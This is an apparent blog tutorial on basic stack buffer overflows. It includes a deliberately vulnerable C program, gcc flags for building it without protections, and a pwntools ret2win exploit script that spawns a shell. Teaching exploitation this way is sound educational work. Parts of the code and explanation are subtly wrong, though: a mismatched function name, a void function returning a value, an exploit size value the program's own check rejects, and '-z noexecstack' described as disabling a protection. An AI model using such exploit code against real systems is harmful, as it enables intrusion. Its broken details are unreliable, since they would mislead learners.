+++
author = "Emily Miller"
title = "How to: Basic buffer overflows without stack protections"
date = "2025-02-10"
description = """This is a simple guide on how to perform basic buffer
overflows, including an example exploit script."""
categories = [ "binary-exploitation" ]
+++

Kind of starting a little basic, but what is a buffer overflow? Effectively,
when the program is expecting a certain amount of data to be written, and more
data than that gets written, *overflowing* the buffer. When done on the stack
(the most basic case), this is often called *stack smashing* (as seen in the amazing stack canary message "**** stack smashing detected ****").

For instance, if our memory looks something like below:

`| Other function memory (variables, etc.) | Buffer | More function memory |
return address |`

What we can do to gain control flow is write through that Buffer and the
function memory and overwrite the return address. Often, this occurs in ret2win
style challenges, where we need to return to some win function.

Lets take the following code as our example:
```c
void win() {
    return system("/bin/sh");
}
int main(int argc, char **argv, char **envp) {
    char buffer[64];  // Vulnerable buffer size
    int size;

    printf("Enter the size of your input: ");
    scanf("%d", &size);  // User inputs the size for fgets

    if (size > 0 && size < sizeof(buffer)) {
        printf("Enter your input: ");
        fgets(buffer, size, stdin);
	    print_quotes(buffer);
    }
	return 0;
}
void print_quoted(char *s) {
	printf(quote(s));
	return;
}
char* quote(char *s) {
	char output[16];
	sprintf(output, "\"%s\"", s);
	return output;
}
```

The example above looks a little convoluted, and I've done that because that's
what real buffer overflows look like. 99% of the time, these come from the
programmer writing some piece of code to do some small task (in this case
wrapping some string in quotes), and forgetting to account for issues that may
arise with how things interact with it. The more experienced among you may notice
a second vulnerability lurking in this program, but we'll cover that another
time.

Note if you want to follow at home, you will need to compile with stack
protections disabled, which can be done like `gcc -fno-stack-protector -z
noexecstack -no-pie -o vulnerable_program vulnerable_program.c` (Take a moment
to notice just how many things we're having to disable in order to make this
work --- this is something that rarely happens in modern programs, which is why
more advanced exploitation techniques are usually needed).
`

Here, we can use a very simple exploit to attack it:

```python
from pwn import *

# Hacker defined parameters
process_name = "./vulnerable_program"
offset = 64 # Placeholder, you'll need to find this using GDB
win_address = 0x123456 # You get this from GDB as well

# Calculate our payload
payload = b"A"*offset + p64(win_address) # <-- standard buffer overflow payload

# Exploit
p = process(process_name)
p.sendline(bytes(str(offset+8), "utf-8"))
p.sendline(payload)

# Reap the benefits
p.interactive()
```
Another important thing to keep in mind is those parameters need to be
determined by you, the attacker. There are ways of getting around this,
including automatic static analysis of the binary (some of which can be done in
`pwntools`, albeit with some reliability issues) and fuzzing, but that's a topic
to explore on your own as you gain more exploit development experience.
